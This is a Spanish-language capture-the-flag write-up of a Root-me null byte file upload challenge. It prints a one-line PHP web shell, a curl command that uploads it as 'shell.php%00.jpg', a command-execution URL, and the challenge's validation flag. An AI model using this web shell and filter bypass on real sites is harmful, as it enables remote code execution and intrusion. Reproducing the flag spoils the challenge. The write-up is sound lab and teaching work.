---

# Root-me Write-up: File Upload - Null Byte

## 1. Análisis de la Aplicación

Se identificó una aplicación de "Photo Gallery" que permite la subida de archivos de imagen. El sistema realiza una validación de extensión en el lado del servidor, permitiendo únicamente archivos `.jpg`, `.png` y similares.

## 2. Identificación de la Vulnerabilidad

La aplicación es vulnerable a la inyección de un **Byte Nulo (Null Byte Poisoning)**. Esta técnica aprovecha la diferencia en cómo los lenguajes de alto nivel (como PHP) y las funciones de bajo nivel del sistema operativo (escritas en C) manejan el final de una cadena de texto.

* **PHP** ve `shell.php%00.jpg` y acepta el archivo porque termina en una extensión permitida.
* **El Sistema Operativo** detecta el byte nulo (`0x00`) y termina la cadena en ese punto, guardando el archivo físicamente como `shell.php`.

## 3. Explotación

### Paso 1: Creación del Payload

Se creó un archivo `shell.php` con una **web shell** básica para ejecución remota de comandos (RCE):

```php
<?php system($_GET['cmd']); ?>

```

### Paso 2: Subida con Inyección de Byte Nulo

Utilizando `curl`, se interceptó el nombre del archivo enviado para insertar la secuencia de escape `%00` seguida de la extensión permitida.

```bash
curl -v -F "file=@shell.php;filename=shell.php%00.jpg" \
     -F "submit=Upload" \
     "http://challenge01.root-me.org/web-serveur/ch22/?action=upload"

```

**Resultado del Servidor:**
El servidor confirmó la subida exitosa en la ruta:
`./galerie/upload/[PHPSESSID]/shell.php%00.jpg`

### Paso 3: Ejecución de Comandos (RCE)

Debido a la vulnerabilidad, el archivo es accesible y ejecutable como PHP ignorando la extensión posterior al byte nulo. Se ejecutó el comando `whoami` para verificar el acceso y localizar la flag.

**URL de ejecución:**
`http://challenge01.root-me.org/web-serveur/ch22/galerie/upload/[ID]/shell.php?cmd=whoami`

## 4. Conclusión y Flag

Al ejecutar los comandos pertinentes, el sistema devolvió el mensaje de éxito y la contraseña de validación.

**Flag:** `YPNchi2NmTwygr2dgCCF`

---

## Lecciones Aprendidas

* **Validación Incompleta:** Confiar únicamente en la extensión del archivo es peligroso. Los filtros deben usar listas blancas estrictas y sanitizar caracteres especiales.
* **Evasión de Filtros:** El byte nulo es una técnica clásica que demuestra por qué es vital que el lenguaje de programación y el sistema de archivos manejen las cadenas de forma consistente.
* **Remediación:** En versiones modernas de PHP (5.3.4+), este ataque ha sido mitigado en las funciones internas, pero sigue siendo relevante en sistemas legacy o configuraciones personalizadas inseguras.


